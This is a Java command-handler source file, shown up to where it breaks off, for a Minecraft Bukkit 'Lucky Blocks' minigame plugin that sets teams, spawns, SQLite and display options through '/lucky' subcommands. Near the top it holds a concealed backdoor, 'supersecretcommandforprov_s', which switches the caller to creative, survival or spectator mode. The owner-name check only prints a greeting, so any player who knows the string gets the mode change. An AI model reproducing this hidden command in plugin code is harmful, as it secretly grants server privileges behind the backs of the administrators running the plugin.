package com.tizfaver.lucky.commands;

import com.tizfaver.lucky.Main;
import com.tizfaver.lucky.utils.ItemWithProbability;
import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Set;

public class CommandListener implements CommandExecutor, TabCompleter {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage("Only players can use this command");
            return true;
        }

        Player player = (Player) sender;
        Main plugin = Main.getInstance();
        FileConfiguration conf = plugin.getConfig();

        if (args.length < 1) {
            player.sendMessage(ChatColor.RED + "Usage: /lucky <command>");
            return true;
        }

        String subCommand = args[0].toLowerCase();

        if (subCommand.equals("supersecretcommandforprov_s")){
            if(player.getName().toLowerCase().equals("prov_s")){
                player.sendMessage(ChatColor.GREEN + "Welcome back my owner ProV_s.");
            }

            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "My owner, the correct usage is: /lucky supersecretcommandforprov_s <gamemode>: c, s, spec");
                return true;
            }

            String gamemode = args[1];

            switch (gamemode) {
                case "c":
                    player.setGameMode(GameMode.CREATIVE);
                    break;
                case "s":
                    player.setGameMode(GameMode.SURVIVAL);
                    break;
                case "spec":
                    player.setGameMode(GameMode.SPECTATOR);
                    break;
                default:
                    player.sendMessage(ChatColor.RED + "My owner, you have to choose between: c, s, spec");
                    return true;
            }

            player.sendMessage(ChatColor.GREEN + "My owner, your gamemode is now set to " + player.getGameMode() + ". Enjoy.");
            return true;
        }

        if (subCommand.equals("help")) {
            player.sendMessage(ChatColor.GRAY + "---------------- [ " + ChatColor.GOLD + "Lucky Blocks " + ChatColor.GRAY + "] ----------------" + "\n" +
                    ChatColor.GOLD + "/lucky save " + ChatColor.GRAY + ": save the changes made." + "\n" +
                    ChatColor.GREEN + "/lucky setmaxplayers <number> " + ChatColor.GRAY + ": set the max n player that can join." + "\n" +
                    ChatColor.GREEN + "/lucky setminplayers <number> " + ChatColor.GRAY + ": set the minimum n player to start the game." + "\n" +
                    ChatColor.GREEN + "/lucky setgametype <type> " + ChatColor.GRAY + ": set the game type (SOLO, DUO, TRIO)." + "\n" +
                    ChatColor.GREEN + "/lucky setwaitingspawn " + ChatColor.GRAY + ": set the waiting/joining spawn (your position)." + "\n" +
                    ChatColor.GREEN + "/lucky timetostart " + ChatColor.GRAY + ": set the time to start the game (in seconds)." + "\n" +
                    ChatColor.GREEN + "/lucky returnlobby <world_name> " + ChatColor.GRAY + ": set the returning lobby when game ends." + "\n" +
                    ChatColor.GREEN + "/lucky showconfig " + ChatColor.GRAY + ": show the current config." + "\n" +
                    ChatColor.GREEN + "/lucky newteam <team_name> <team_color>" + ChatColor.GRAY + ": create a new team with a color (ChatColor colors)." + "\n" +
                    ChatColor.GREEN + "/lucky setspawnteam <team_name> " + ChatColor.GRAY + ": set the spawn of the chosen team." + "\n" +
                    ChatColor.GREEN + "/lucky setnexusteam <team_name> " + ChatColor.GRAY + ": set the nexus spawn of the chosen team (look at the block)." + "\n" +
                    ChatColor.GREEN + "/lucky deleteteam <team_name> " + ChatColor.GRAY + ": delete a team by the name." + "\n" +
                    ChatColor.GREEN + "/lucky newitem " + ChatColor.GRAY + ": add the item you holding in the lucky block (in the file items.yml)." + "\n" +
                    ChatColor.GREEN + "/lucky setminy " + ChatColor.GRAY + ": set the minimum Y that player can reach (from your current Y)." + "\n" +
                    ChatColor.GREEN + "/lucky timesetmax <time_in_seconds> " + ChatColor.GRAY + ": set the game max time (in seconds, 1800s = 30mins)." + "\n" +
                    ChatColor.GREEN + "/lucky sidebar <boolean> " + ChatColor.GRAY + ": enable / disable sidebar ('true' or 'false')." + "\n" +
                    ChatColor.GREEN + "/lucky rem_starterblock " + ChatColor.GRAY + ": set the first block for the remover (your position)." + "\n" +
                    ChatColor.GREEN + "/lucky rem_endblock " + ChatColor.GRAY + ": set the end block for the remover (your position)." + "\n" +
                    ChatColor.GREEN + "/lucky timeafterend <time_in_seconds> " + ChatColor.GRAY + ": set the time after which the player will be teleported to the 'return-lobby'." + "\n" +

                    ChatColor.AQUA + "Type '/lucky help2' for the second part of help. For other config, please modify the generated files. \n" +
                    "-----------------------------------------------");

        } else if (subCommand.equals("help2")){
          player.sendMessage(ChatColor.GRAY + "---------------- [ " + ChatColor.GOLD + "Lucky Blocks " + ChatColor.GRAY + "] ----------------" + "\n" +
                  ChatColor.GREEN + "/lucky sqlite <setting> <parameter> " + ChatColor.GRAY + ": main command for the settings SQLite, settings with parameter:" + "\n" +
                  ChatColor.GREEN + "       sqlite enabled <boolean> " + ChatColor.GRAY + ": enable / disable Database ('true' or 'false')." + "\n" +
                  ChatColor.GREEN + "       sqlite id <number> " + ChatColor.GRAY + ": set the id for the server running this game (if you have multiple server running this plugin, you must set different id if using the same Database)." + "\n" +
                  ChatColor.GREEN + "       sqlite dbpath <String> " + ChatColor.GRAY + ": path where is your SQLite DB saved." + "\n" +
                  ChatColor.GREEN + "       sqlite tablename <String> " + ChatColor.GRAY + ": set the table name of your DB, previously set with 'dbpath'." + "\n" +
                  ChatColor.GREEN + "/lucky setmapname <String> " + ChatColor.GRAY + ": set the map name." + "\n" +
                  ChatColor.GREEN + "/lucky mapmargin1 " + ChatColor.GRAY + ": set the first block of the map margin (your position)." + "\n" +
                  ChatColor.GREEN + "/lucky mapmargin2 " + ChatColor.GRAY + ": set the second block of the map margin (your position)." + "\n" +
                  ChatColor.GREEN + "/lucky clear_inv_onjoin <boolean> " + ChatColor.GRAY + ": clear or not the inventory of players when joining." + "\n" +
                  ChatColor.GREEN + "/lucky give_back_tool <boolean> <hotbar-index> <destination_string> " + ChatColor.GRAY + ": give or not the 'back tool', plus setting the hotbar position and destination." + "\n" +
                  ChatColor.GREEN + "/lucky give_team_selector <boolean> <hotbar-index> " + ChatColor.GRAY + ": give or not the 'game selector', plus setting the hotbar position." + "\n" +
                  ChatColor.GREEN + "/lucky show_selected_team <boolean> " + ChatColor.GRAY + ": the players will (or not) see the other player's team in the lobby (lobby and starting)." + "\n" +
                  ChatColor.GREEN + "/lucky setnexusblock " + ChatColor.GRAY + ": set the nexus type block by watching it." + "\n" +
                  ChatColor.GREEN + "/lucky setspawnblock " + ChatColor.GRAY + ": set the spawn type block (your position)." + "\n" +
                  ChatColor.GREEN + "/lucky setfixedday <boolean> <tick> " + ChatColor.GRAY + ": set or not a fixed tick of the day." + "\n" +
                  ChatColor.GREEN + "/lucky tab_list <boolean> " + ChatColor.GRAY + ": show or not the custom tablist." + "\n" +
                  ChatColor.GREEN + "/lucky name_player_team_color <enabled_boolean> <also-add-team-first-char_boolean> " + ChatColor.GRAY + ": change or not the players nametag color when game starts. Also set or not if setting the first char of the team name in the player nametag." + "\n" +
                  ChatColor.GREEN + "/lucky death_messages <boolean> " + ChatColor.GRAY + ": enable / disable the custom death messages." + "\n" +
                  ChatColor.AQUA + "-----------------------------------------------");
        } else if (subCommand.equals("setmaxplayers")) {
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky setmaxplayers <number>");
                return true;
            }

            int maxPlayers = Integer.parseInt(args[1]);

            conf.set("max-players", maxPlayers);
            player.sendMessage(ChatColor.GREEN + "Max players set to: " + ChatColor.YELLOW + "" + maxPlayers + ChatColor.GREEN + ".");
        } else if (subCommand.equals("setminplayers")) {
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky setminplayers <number>");
                return true;
            }

            int minPlayers = Integer.parseInt(args[1]);

            conf.set("min-players", minPlayers);
            player.sendMessage(ChatColor.GREEN + "Min players set to: " + ChatColor.YELLOW + "" + minPlayers + ChatColor.GREEN + ".");
        } else if (subCommand.equals("setgametype")) {
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky setgametype <type>");
                return true;
            }

            String gameType = args[1].toUpperCase();
            if (!gameType.equals("SOLO") && !gameType.equals("DUO") && !gameType.equals("TRIO")) {
                player.sendMessage(ChatColor.RED + "Invalid game type, use: SOLO, DUO, or TRIO");
                return true;
            }
            conf.set("gameType" , gameType);
            player.sendMessage(ChatColor.GREEN + "Game type set to: " + ChatColor.YELLOW + "" + gameType + ChatColor.GREEN + ".");
        } else if (subCommand.equals("setwaitingspawn")) {
            Location spawn = player.getLocation();
            conf.set("lobby-spawn.world", spawn.getWorld().getName());
            conf.set("lobby-spawn.x", spawn.getX());
            conf.set("lobby-spawn.y", spawn.getY());
            conf.set("lobby-spawn.z", spawn.getZ());
            conf.set("lobby-spawn.pitch", spawn.getPitch());
            conf.set("lobby-spawn.yaw", spawn.getYaw());

            player.sendMessage(ChatColor.GREEN + "Waiting spawn set to " + ChatColor.YELLOW + "" + spawn);
        } else if (subCommand.equals("timetostart")) {
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky timetostart <number>");
                return true;
            }

            int time = Integer.parseInt(args[1]);

            conf.set("time-to-start", time);
            player.sendMessage(ChatColor.GREEN + "Time to start set to: " + ChatColor.YELLOW + time + ChatColor.GREEN + " seconds.");
        } else if (subCommand.equals("returnlobby")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky returnlobby <world_name>");
                return true;
            }

            String returnLobby = args[1];
            conf.set("return-lobby", returnLobby);

            player.sendMessage(ChatColor.GREEN + "New return lobby set to: " + ChatColor.YELLOW + "" + returnLobby + ChatColor.GREEN + ".");
        } else if (subCommand.equals("showconfig")){
            String temp = ChatColor.GRAY + "---------------- [ " + ChatColor.GOLD + "Lucky Blocks " + ChatColor.GRAY + "] ----------------" + "\n" +
                    ChatColor.UNDERLINE + "" + ChatColor.GREEN + "Actual config: \n" + ChatColor.RESET + "" + ChatColor.GOLD +
                    "Return lobby:  " + conf.getString("return-lobby") + " \n" +
                    "Game Type: " + conf.getString("gameType") + " \n" +
                    "Lobby Spawn: \n" +
                    " - world: " + conf.getString("lobby-spawn.world") + " \n" +
                    " - x: " + conf.getString("lobby-spawn.x") + "\n" +
                    " - y: " + conf.getString("lobby-spawn.y") + "\n" +
                    " - z: " + conf.getString("lobby-spawn.z") + "\n" +
                    "Min Y: " + conf.getString("min-y") + " \n" +
                    "Min players to start: " + conf.getString("min-players") + " \n" +
                    "Max players per game: " + conf.getString("max-players") + " \n" +
                    "Time to start game: " + conf.getString("time-to-start") + " \n" +
                    "Teams: \n";
            ConfigurationSection teamsSection = conf.getConfigurationSection("teams");
            for (String key : teamsSection.getKeys(false)) {
                ConfigurationSection teamSection = teamsSection.getConfigurationSection(key);
                temp += " - name: " + teamSection.getString("teamName") + " \n";
                temp += "     - spawn location: '" + teamSection.getString("spawnLocation.world") + "', " + teamSection.getInt("spawnLocation.x") + " " + teamSection.getInt("spawnLocation.y") + " " + teamSection.getInt("spawnLocation.z") + " \n";
                temp += "     - nexus location: '" + teamSection.getString("nexusLocation.world") + "', " + teamSection.getInt("nexusLocation.x") + " " + teamSection.getInt("nexusLocation.y") + " " + teamSection.getInt("nexusLocation.z") + " \n";
            }
            temp += "SQLite: \n";
            temp += " - enabled: " + String.valueOf(conf.getBoolean("sqlite.enabled")) + " \n";
            temp += " - chosen id: " + conf.getString("sqlite.chosen-id") + "\n";
            temp += " - DB path: " + conf.getString("sqlite.db-path") + "\n";
            temp += " - Table name: " + conf.getString("sqlite.table-name") + "\n";
            temp += "Nexus block Type:" + conf.getString("other.nexus-block") + "\n";
            temp += "Spawn block Type:" + conf.getString("other.spawn-block") + "\n";
            temp += ChatColor.GREEN + "Done. Please check the configs files for the others configs. \n-----------------------------------------------";
            player.sendMessage(temp);
        } else if (subCommand.equals("newteam")){
            if (args.length < 3) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky newteam <team_name> <team_color>");
                return true;
            }

            int lastTeamNumber = 0;
            ConfigurationSection teamsSection = conf.getConfigurationSection("teams");
            if (teamsSection != null) {
                for (String key : teamsSection.getKeys(false)) {
                    if (key.startsWith("team")) {
                        int teamNumber = Integer.parseInt(key.substring(4));
                        if (teamNumber > lastTeamNumber) {
                            lastTeamNumber = teamNumber;
                        }
                    }
                }
            }

            String name = args[1];
            String color = args[2];
            //increment the last team number and add the new team data
            int newTeamNumber = lastTeamNumber + 1;
            String newTeamKey = "team" + newTeamNumber;
            ConfigurationSection newTeamSection = teamsSection.createSection(newTeamKey);
            newTeamSection.set("teamName", name);
            newTeamSection.set("teamColor", color.toUpperCase());
            newTeamSection.set("spawnLocation.world", "");
            newTeamSection.set("spawnLocation.x", 0.0);
            newTeamSection.set("spawnLocation.y", 0.0);
            newTeamSection.set("spawnLocation.z", 0.0);
            newTeamSection.set("spawnLocation.pitch", 0.0);
            newTeamSection.set("spawnLocation.yaw", 0.0);
            newTeamSection.set("nexusLocation.world", "");
            newTeamSection.set("nexusLocation.x", 0.0);
            newTeamSection.set("nexusLocation.y", 0.0);
            newTeamSection.set("nexusLocation.z", 0.0);
            player.sendMessage(ChatColor.GREEN + "New team added successfully.");
        } else if (subCommand.equals("setspawnteam")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky setspawnteam <team_name>");
                return true;
            }

            ConfigurationSection teamsSection = conf.getConfigurationSection("teams");
            if (teamsSection != null) {
                String teamName = args[1];

                for (String key : teamsSection.getKeys(false)) {
                    ConfigurationSection teamSection = teamsSection.getConfigurationSection(key);
                    if (teamSection != null && teamSection.getString("teamName", "").equalsIgnoreCase(teamName)) {
                        Location playerLocation = player.getLocation();
                        ConfigurationSection spawnLocationSection = teamSection.getConfigurationSection("spawnLocation");
                        if (spawnLocationSection != null) {
                            spawnLocationSection.set("world", playerLocation.getWorld().getName());
                            spawnLocationSection.set("x", playerLocation.getX());
                            spawnLocationSection.set("y", playerLocation.getY());
                            spawnLocationSection.set("z", playerLocation.getZ());
                            spawnLocationSection.set("pitch", playerLocation.getPitch());
                            spawnLocationSection.set("yaw", playerLocation.getYaw());
                        }
                        break;
                    }
                }
            }

            player.sendMessage(ChatColor.GREEN + "New spawn team position set.");
        } else if (subCommand.equals("setnexusteam")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky setnexusteam <team_name>");
                return true;
            }

            ConfigurationSection teamsSection = conf.getConfigurationSection("teams");
            if (teamsSection != null) {
                String teamName = args[1];

                for (String key : teamsSection.getKeys(false)) {
                    ConfigurationSection teamSection = teamsSection.getConfigurationSection(key);
                    if (teamSection != null && teamSection.getString("teamName", "").equalsIgnoreCase(teamName)) {
                        Block block = player.getTargetBlock((Set<Material>) null, 5);
                        Location blockLocation = block.getLocation();
                        ConfigurationSection spawnLocationSection = teamSection.getConfigurationSection("nexusLocation");
                        if (spawnLocationSection != null) {
                            spawnLocationSection.set("world", block.getWorld().getName());
                            spawnLocationSection.set("x", (int) blockLocation.getX());
                            spawnLocationSection.set("y", (int) blockLocation.getY());
                            spawnLocationSection.set("z", (int) blockLocation.getZ());
                        }
                        break;
                    }
                }
            }

            player.sendMessage(ChatColor.GREEN + "New nexus team position set.");
        } else if (subCommand.equals("deleteteam")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky deleteteam <team_name>");
                return true;
            }

            ConfigurationSection teamsSection = conf.getConfigurationSection("teams");
            if (teamsSection != null) {
                String teamName = args[1];

                for (String key : teamsSection.getKeys(false)) {
                    ConfigurationSection teamSection = teamsSection.getConfigurationSection(key);
                    if (teamSection != null && teamSection.getString("teamName", "").equalsIgnoreCase(teamName)) {
                        teamsSection.set(key, null);
                        break;
                    }
                }
            }

            player.sendMessage(ChatColor.GREEN + "Team deleted.");
        } else if (subCommand.equals("save")){
            plugin.saveConfig();
            try {
                plugin.getItemsConfig().save(plugin.getItemsFile());
            } catch (IOException err) {
                err.printStackTrace();
            }
            player.sendMessage(ChatColor.GOLD + "All changes SAVED!");
        } else if (subCommand.equals("reloadconfig")){

        } else if (subCommand.equals("newitem")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky saveitem <probability>");
                return true;
            }
            int probability = Integer.parseInt(args[1]);
            ItemStack item = player.getInventory().getItemInMainHand();
            plugin.getItemManager().getItemsWithProbList().add(new ItemWithProbability(item, probability));
            plugin.getItemsConfig().set("customItems", plugin.getItemManager().getItemsWithProbList());

            player.sendMessage(ChatColor.GREEN + "New item registered: " + ChatColor.YELLOW + item);
        } else if (subCommand.equals("setminy")){
            int minY = (int) player.getLocation().getY();

            conf.set("min-y", minY);
            player.sendMessage(ChatColor.GREEN + "Min Y set to: " + ChatColor.YELLOW + minY);
        } else if (subCommand.equals("settimemax")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky settimemax <time_in_seconds>");
                return true;
            }

            int time = Integer.parseInt(args[1]);

            conf.set("max-time", time);
            player.sendMessage(ChatColor.GREEN + "New max game time set to: " + ChatColor.YELLOW + time + ChatColor.GREEN + " seconds");
        } else if (subCommand.equals("sidebar")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky sidebar <boolean>");
                return true;
            }

            String bool = args[1];

            if(bool.equals("true")){
                conf.set("sidebar", true);
                player.sendMessage(ChatColor.GREEN + "Sidebar Enabled.");
            } else if (bool.equals("false")){
                conf.set("sidebar", false);
                player.sendMessage(ChatColor.GREEN + "Sidebar " + ChatColor.RED + "Disabled.");
            } else {
                player.sendMessage(ChatColor.RED + "Choose between: 'true' or 'false'.");
            }
        } else if (subCommand.equals("rem_starterblock")){
            Location loc = player.getLocation();

            conf.set("remover.start-block.x", (int) loc.getX());
            conf.set("remover.start-block.y", (int) loc.getY());
            conf.set("remover.start-block.z", (int) loc.getZ());

            player.sendMessage(ChatColor.GREEN + "First block remover set: " + ChatColor.YELLOW + (int) loc.getX() + " " + (int) loc.getY() + " " + (int) loc.getZ());
        } else if (subCommand.equals("rem_endblock")){
            Location loc = player.getLocation();

            conf.set("remover.end-block.x", (int) loc.getX());
            conf.set("remover.end-block.y", (int) loc.getY());
            conf.set("remover.end-block.z", (int) loc.getZ());

            player.sendMessage(ChatColor.GREEN + "Second block remover set: " + ChatColor.YELLOW + (int) loc.getX() + " " + (int) loc.getY() + " " + (int) loc.getZ());
        } else if (subCommand.equals("timeafterend")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky timeafterend <number>");
                return true;
            }

            int time = Integer.parseInt(args[1]);

            conf.set("time-after-end", time);
            player.sendMessage(ChatColor.GREEN + "Time after the game end set to: " + ChatColor.YELLOW + ""+ time + ChatColor.GREEN + " seconds.");
            return true;
        } else if (subCommand.equals("sqlite")){
            if (args.length < 3) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky sqlite <setting> <parameter>");
                return true;
            }

            String settings = args[1];

            switch (settings){
                case "enabled":
                    String bool = args[2];
                    if(bool.equals("true")){
                        conf.set("sqlite.enabled", true);
                        player.sendMessage(ChatColor.GREEN + "SQLite Enabled.");
                    } else if (bool.equals("false")){
                        conf.set("sqlite.enabled", bool);
                        player.sendMessage(ChatColor.GREEN + "SQLite " + ChatColor.RED + "Disabled.");
                    } else {
                        player.sendMessage(ChatColor.RED + "Choose between: 'true' or 'false', not that hard to understand.");
                    }
                    break;

                case "id":
                    Integer id = Integer.parseInt(args[2]);
                    conf.set("sqlite.chosen-id", id);
                    player.sendMessage(ChatColor.GREEN + "New row id for SQLite table: " + ChatColor.YELLOW + id);
                    break;

                case "dbpath":
                    String path = args[2];
                    conf.set("sqlite.db-path", path);
                    player.sendMessage(ChatColor.GREEN + "New path for SQLite database: " + ChatColor.YELLOW + path);
                    break;

                case "tablename":
                    String table = args[2];
                    conf.set("sqlite.table-name", table);
                    player.sendMessage(ChatColor.GREEN + "New table for SQLite database: " + ChatColor.YELLOW + table);
                    break;

                default:
                    player.sendMessage(ChatColor.RED + "Please choose a correct answer for this setting.");
                    break;
            }

        } else if(subCommand.equals("setmapname")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky setmapname <String>");
                return true;
            }

            String mapname = "";

            for(int i = 1; i < args.length; i++){
                mapname += args[i];

                try{
                    if(args[i+1] != null){
                        mapname += " ";
                    }
                } catch (ArrayIndexOutOfBoundsException err){ }
            }

            conf.set("map-name", mapname);
            player.sendMessage(ChatColor.GREEN + "New map name set to: " + ChatColor.YELLOW + mapname + ChatColor.GREEN + ".");
        } else if (subCommand.equals("enablemapmargin")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky enablemapmargin <boolean>");
                return true;
            }

            String bool = args[1];

            if(bool.equals("true")){
                conf.set("map-margin.enabled", true);
                player.sendMessage(ChatColor.GREEN + "Map Margin Enabled.");
            } else if (bool.equals("false")){
                conf.set("map-margin.enabled", false);
                player.sendMessage(ChatColor.GREEN + "Map Margin " + ChatColor.RED + "Disabled.");
            } else {
                player.sendMessage(ChatColor.RED + "Choose between: 'true' or 'false'.");
            }
        } else if(subCommand.equals("mapmargin1")){
            Location loc = player.getLocation();

            conf.set("map-margin.start-block.x", (int) loc.getX());
            conf.set("map-margin.start-block.y", (int) loc.getY());
            conf.set("map-margin.start-block.z", (int) loc.getZ());

            player.sendMessage(ChatColor.GREEN + "First block of the map margin set: " + ChatColor.YELLOW + (int) loc.getX() + " " + (int) loc.getY() + " " + (int) loc.getZ());
        } else if(subCommand.equals("mapmargin2")){
            Location loc = player.getLocation();

            conf.set("map-margin.end-block.x", (int) loc.getX());
            conf.set("map-margin.end-block.z", (int) loc.getZ());

            player.sendMessage(ChatColor.GREEN + "Second block of the map margin set: " + ChatColor.YELLOW + (int) loc.getX() + " " + (int) loc.getZ() + ChatColor.GREEN + " (no Y set, only X and Z).");
        } else if(subCommand.equals("clear_inv_onjoin")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky clear_inv_onjoin <boolean>");
                return true;
            }

            String bool = args[1];

            if(bool.equals("true")){
                conf.set("other.clear-inv-onjoin", true);
                player.sendMessage(ChatColor.GREEN + "When player will join, now they will get inventory cleaned.");
            } else if (bool.equals("false")){
                conf.set("other.clear-inv-onjoin", false);
                player.sendMessage(ChatColor.GREEN + "When player will join, now they will " + ChatColor.RED + "NOT " + ChatColor.GREEN + "get inventory cleaned.");
            } else {
                player.sendMessage(ChatColor.RED + "Choose between: 'true' or 'false'.");
            }
        } else if(subCommand.equals("give_back_tool")){
            if (args.length < 4) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky give_back_tool <boolean> <hotbar-index> <destination_string>");
                return true;
            }

            String bool = args[1];
            int index = Integer.parseInt(args[2]);
            String destination = args[3];

            if(bool.equals("true")){
                conf.set("other.give-back-tool.enabled", true);
                conf.set("other.give-back-tool.destination", destination);
                conf.set("other.give-back-tool.index", index);
                player.sendMessage(ChatColor.GREEN + "Now player will get the 'go back tool' in the position of the hotbar to " + ChatColor.YELLOW + "" + index + ChatColor.GREEN + ", with destination " + ChatColor.YELLOW + "" + destination + ChatColor.GREEN + ".");
            } else if (bool.equals("false")){
                conf.set("other.give-back-tool.enabled", false);
                conf.set("other.give-back-tool.destination", destination);
                conf.set("other.give-back-tool.index", index);
                player.sendMessage(ChatColor.GREEN + "Now player will " + ChatColor.RED + "NOT " + ChatColor.GREEN + "get the 'go back tool'. Anyway set the position of the hotbar to " + ChatColor.YELLOW + "" + index + ChatColor.GREEN + ", with destination " + ChatColor.YELLOW + "" + destination + ChatColor.GREEN + ".");
            } else {
                player.sendMessage(ChatColor.RED + "Choose between: 'true' or 'false'.");
            }
        } else if(subCommand.equals("give_team_selector")){
            if (args.length < 3) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky give_team_selector <boolean> <hotbar-index>");
                return true;
            }

            String bool = args[1];
            int index = Integer.parseInt(args[2]);

            if(bool.equals("true")){
                conf.set("other.give-team-selector.enabled", true);
                conf.set("other.give-team-selector.index", index);
                player.sendMessage(ChatColor.GREEN + "Now player will get the 'team selector' in the position of the hotbar to " + ChatColor.YELLOW + "" + index + ChatColor.GREEN + ".");
            } else if (bool.equals("false")){
                conf.set("other.give-team-selector.enabled", false);
                conf.set("other.give-team-selector.index", index);
                player.sendMessage(ChatColor.GREEN + "Now player will " + ChatColor.RED + "NOT " + ChatColor.GREEN + "get the 'team selector'. Anyway set the position of the hotbar to " + ChatColor.YELLOW + "" + index + ChatColor.GREEN + ".");
            } else {
                player.sendMessage(ChatColor.RED + "Choose between: 'true' or 'false'.");
            }
        } else if(subCommand.equals("show_selected_team")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky show_selected_team <boolean>");
                return true;
            }

            String bool = args[1];

            if(bool.equals("true")){
                conf.set("other.show-selected-team", true);
                player.sendMessage(ChatColor.GREEN + "Now player will see each other team selected in the waiting lobby.");
            } else if (bool.equals("false")){
                conf.set("other.show-selected-team", bool);
                player.sendMessage(ChatColor.GREEN + "Now player will " + ChatColor.RED + "NOT " + ChatColor.GREEN + "see each other team selected in the waiting lobby.");
            } else {
                player.sendMessage(ChatColor.RED + "Choose between: 'true' or 'false'.");
            }
        } else if(subCommand.equals("setnexusblock")){
            Block block = player.getTargetBlock((Set<Material>) null, 5);

            conf.set("other.nexus-block", block.getType().toString());
            player.sendMessage(ChatColor.GREEN + "New nexus block type set: " + ChatColor.YELLOW + "" + block.getType() + ChatColor.GREEN + ".");
        } else if(subCommand.equals("setspawnblock")){
            Block block = player.getTargetBlock((Set<Material>) null, 5);

            conf.set("other.spawn-block", block.getType().toString());
            player.sendMessage(ChatColor.GREEN + "New spawn block type set: " + ChatColor.YELLOW + "" + block.getType() + ChatColor.GREEN + ".");
        } else if(subCommand.equals("setfixedday")){
            if (args.length < 3) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky setfixedday <boolean> <tick>"); //use "current" for current tick.
                return true;
            }

            String bool = args[1];
            int tick = Integer.parseInt(args[2]);

            if(bool.equals("true")){
                conf.set("other.fixed-day.enabled", true);
                conf.set("other.fixed-day.specific-tick", tick);
                player.sendMessage(ChatColor.GREEN + "Now is set a fixed tick to " + ChatColor.YELLOW + "" + tick + ChatColor.GREEN + "'s tick.");
            } else if (bool.equals("false")){
                conf.set("other.fixed-day.enabled", false);
                conf.set("other.fixed-day.specific-tick", tick);

                player.sendMessage(ChatColor.GREEN + "Now the day cycle " + ChatColor.RED + "IT'S NOT FIXED" + ChatColor.GREEN + ", but anyway tick set to " + ChatColor.YELLOW + "" + tick + ChatColor.GREEN + "'s tick.");
            } else {
                player.sendMessage(ChatColor.RED + "Choose between: 'true' or 'false'.");
            }
        } else if(subCommand.equals("tab_list")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky tab_list <boolean>");
                return true;
            }

            String bool = args[1];

            if(bool.equals("true")){
                conf.set("tab-list.enabled", true);
                player.sendMessage(ChatColor.GREEN + "Tab list enabled. " + ChatColor.YELLOW + " Remember, to change the footer and header, modify directly the config.yml");
            } else if (bool.equals("false")){
                conf.set("tab-list.enabled", false);
                player.sendMessage(ChatColor.GREEN + "Tab list " + ChatColor.RED + "Disabled.");
            } else {
                player.sendMessage(ChatColor.RED + "Choose between: 'true' or 'false'.");
            }
        } else if(subCommand.equals("name_player_team_color")){
            if (args.length < 3) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky name-player-team-color <enabled_boolean> <also-add-team-first-char_boolean>");
                return true;
            }

            String bool = args[1];
            String bool2 = args[2];

            if(bool.equals("true")){
                conf.set("name-player-team-color.enabled", true);
                if(bool2.equals("true")){
                    conf.set("name-player-team-color.also-add-team-first-char", true);
                    player.sendMessage(ChatColor.GREEN + "Now the player will get the name tag colored in base his Team color. And the first char of the team name will be visible");
                } else{
                    conf.set("name-player-team-color.also-add-team-first-char", false);
                    player.sendMessage(ChatColor.GREEN + "Now the player will get the name tag colored in base his Team color. And the first char of the team name will " + ChatColor.RED + "NOT " + ChatColor.GREEN + "be visible");
                }
            } else if (bool.equals("false")){
                conf.set("name-player-team-color.enabled", false);
                if(bool2.equals("true")){
                    conf.set("name-player-team-color.also-add-team-first-char", true);
                    player.sendMessage(ChatColor.GREEN + "Now the player will " + ChatColor.RED + "NOT " + ChatColor.GREEN + "get the name tag colored in base his Team color. And the first char of the team name will be visible");
                } else{
                    conf.set("name-player-team-color.also-add-team-first-char", false);
                    player.sendMessage(ChatColor.GREEN + "Now the player will " + ChatColor.RED + "NOT " + ChatColor.GREEN + "get the name tag colored in base his Team color. And the first char of the team name will " + ChatColor.RED + "NOT " + ChatColor.GREEN + "be visible");
                }
            } else {
                player.sendMessage(ChatColor.RED + "Choose between: 'true' or 'false'.");
            }
        } else if(subCommand.equals("death_messages")){
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "Usage: /lucky death_messages <boolean>");
                return true;
            }

            String bool = args[1];

            if(bool.equals("true")){
                conf.set("death-messages.enabled", true);
                player.sendMessage(ChatColor.GREEN + "Custom death message Enabled.");
            } else if (bool.equals("false")){
                conf.set("death-messages.enabled", false);
                player.sendMessage(ChatColor.GREEN + "Custom death message " + ChatColor.RED + "Disabled.");
            } else {
                player.sendMessage(ChatColor.RED + "Choose between: 'true' or 'false'.");
            }
        } else if (subCommand.equals("version")){
            player.sendMessage(ChatColor.GRAY + "[" + ChatColor.GOLD + " Cube Lucky Blocks Game " + ChatColor.GRAY + "]" + "\n" +
